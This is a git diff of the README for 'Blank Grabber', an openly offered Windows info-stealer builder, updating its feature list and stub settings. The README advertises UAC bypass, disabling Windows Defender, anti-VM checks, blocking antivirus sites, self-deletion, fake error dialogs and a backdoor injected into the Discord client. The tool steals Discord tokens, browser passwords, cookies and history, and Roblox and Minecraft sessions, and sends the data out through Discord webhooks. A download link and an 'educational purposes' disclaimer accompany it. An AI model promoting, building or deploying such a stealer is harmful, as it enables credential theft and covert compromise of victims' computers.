@@ -23,39 +23,40 @@
 ## Table of Contents
 - [Download](#download)
 - [Features](#features)
-- [Togglable options](#togglable-options)
+- [Stub Settings](#stub-settings)
 - [Requirements](#requirements)
 - [How to Build?](#how-to-build)
-- [To-Do/Enhancements](#to-doenhancements)	<!-- - [Crypter](#crypter)-->
+- [To-Do/Enhancements](#to-doenhancements)
 - [Contact me](#contact-me)
 
 ## Download
 [![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/Blank-c/Blank-Grabber/archive/refs/heads/main.zip)
 
-**Disclaimer:** This tool is for "educational" purpose only, and I am not responsible for any damage caused by it in any way!
+**Disclaimer:** This program is provided for educational and research purposes only. The creator of this program does not condone or support any illegal or malicious activity, and will not be held responsible for any such actions taken by others who may use this program. By downloading or using this program, you acknowledge that you are solely responsible for any consequences that may result from the use of this program.
 
-**Note:** If you didn't get any result while testing the grabber on yourself, you may try to turn off VMPROTECT as the grabber might have detected your system as a virtual machine.
+**Note:** If you didn't get any data when testing the grabber on yourself, you may try to turn off Anti VM as the grabber might have detected your system as a virtual machine.
 
 ## Features
     • GUI Builder.
     • UAC Bypass.
+    • Custom Icon.
     • Runs On Startup.
     • Disables Windows Defender.
     • Anti-VM.
     • Blocks AV-Related Sites
-    • Hides/Deletes Itself.
-    • Custom Message Box.
+    • Melt Stub.
+    • Fake Error.
     • EXE Binder.
-    • Better Obfuscation.
+    • Obfuscated Stub.
     • Anti Unpacking Technique (Removed due to bugs).
     • Anti UPX-Detection by YARA (Removed due to bugs).
     • Anti Pyinstaller-Detection by YARA (Removed due to bugs).
+    • Puts Backdoor On Discord Client.
     • Grabs Discord Tokens.
-    • Injects javascript in Discord client's files.
-    • Grabs Passwords from many browsers (Internet Explorer, Mozilla Firefox, Google Chrome, Safari, and Opera.).
-    • Grabs Chrome Cookies (Netscape format, Importable).
-    • Grabs Chrome History.
-    • Grabs Minecraft Session.
+    • Grabs Passwords From Many Browsers.
+    • Grabs Cookies From Many Browsers.
+    • Grabs History From Many Browsers.
+    • Grabs Minecraft Session Files.
     • Grabs Roblox Cookies.
     • Grabs IP Information.
     • Grabs System Info.
@@ -65,24 +66,23 @@
     • Sends All Data Through Discord Webhooks.
     (...more)
 
-## Togglable Options
+## Stub Settings
 | Option | Description |
 | ------ | ----------- |
 | **Ping Me** | Pings [@everyone](https://www.remote.tools/remote-work/discord-everyone-here#what-is-everyone) when someone runs the stub. |
-| **VM Protect** | Tries its best to prevent running in Virtual Machine. |
-| **BSOD** | Triggers Blue Screen of Death when ran on Virtual Machine. |
-| **Startup** | Runs the stub on Windows starup. |
-| **Delete Self** | Deletes the grabber after use. |
-| **Discord Injection** | Adds malicious Javascript code to the Discord client for persistence. |
+| **Anti VM** | Tries its best to prevent running in Virtual Machine. |
+| **Put On Startup** | Runs the stub on Windows starup. |
+| **Melt Stub** | Deletes the grabber after use. |
+| **Fake Error** | Create custom (fake) error. |
 | **Block AV Sites** | Blocks AV related sites ([Unblock](https://github.com/Blank-c/Blank-Grabber/issues/117)). |
-| **Message Box** | Create custom message box. |
+| **Discord Injection** | Puts backdoor on the Discord client for persistence. |
 
 **Supports:** *Windows OS (Tested on Windows 10).*
 
 ## Requirements
 **To build the stub, you need:**
 - Windows 10.
-- Python 3.9+.
+- Python 3.10+.
 - An active internet connection.
 
 ## How to Build?
@@ -100,7 +100,7 @@
 ## To-Do/Enhancements
 - [x] Grab saved WIFI passwords.
 - [x] Icon selector for stub.
-- [x] Message Box.
+- [x] Fake Error.
 - [x] EXE Binder.
 - [x] Remove some features because they cause bugs.
 - [x] Discord JS Injection.
